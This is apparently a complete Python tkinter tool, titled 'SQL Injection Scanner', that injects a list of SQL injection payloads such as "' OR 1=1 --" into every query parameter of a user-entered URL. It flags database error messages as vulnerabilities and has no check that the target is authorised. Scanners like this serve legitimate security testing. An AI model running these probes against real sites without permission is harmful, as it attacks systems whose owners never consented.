import tkinter as tk
from tkinter import scrolledtext, messagebox
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

payloads = [
    "'", "' OR 1=1 --", "\" OR \"1\"=\"1", "'--", "'#"
]

sql_errors = [
    "you have an error in your sql syntax",
    "sqlstate",
    "mysql",
    "unclosed quotation",
    "syntax error",
    "ORA-"
]

def get_params(url):
    parsed = urlparse(url)
    return list(parse_qs(parsed.query).keys())

def inject_payload(url, param, payload):
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    qs[param] = [payload]
    new_query = urlencode(qs, doseq=True)
    new_url = urlunparse(parsed._replace(query=new_query))
    return new_url

def check_sql_error(response_text):
    for error in sql_errors:
        if error.lower() in response_text.lower():
            return error
    return None

def scan_url(url, output_widget):
    params = get_params(url)
    if not params:
        output_widget.insert(tk.END, "[!] No query parameters found in the URL.\n")
        return

    for param in params:
        for payload in payloads:
            test_url = inject_payload(url, param, payload)
            output_widget.insert(tk.END, f"Testing {param} with payload {repr(payload)}... ")
            output_widget.update()
            try:
                resp = requests.get(test_url, timeout=7)
                error = check_sql_error(resp.text)
                if error:
                    output_widget.insert(tk.END, f"VULNERABLE! ({error})\n")
                else:
                    output_widget.insert(tk.END, "No error detected.\n")
            except requests.RequestException as e:
                output_widget.insert(tk.END, f"Request failed: {e}\n")

def on_scan():
    url = url_entry.get().strip()
    output_text.delete(1.0, tk.END)
    if not url.startswith("http"):
        messagebox.showwarning("Invalid URL", "Please enter a valid http/https URL.")
        return
    scan_url(url, output_text)

root = tk.Tk()
root.title("SQL Injection Scanner")

tk.Label(root, text="Target URL:").pack(pady=5)
url_entry = tk.Entry(root, width=60)
url_entry.pack(pady=5)

scan_btn = tk.Button(root, text="Scan", command=on_scan)
scan_btn.pack(pady=5)

output_text = scrolledtext.ScrolledText(root, width=80, height=20)
output_text.pack(padx=10, pady=10)

root.mainloop()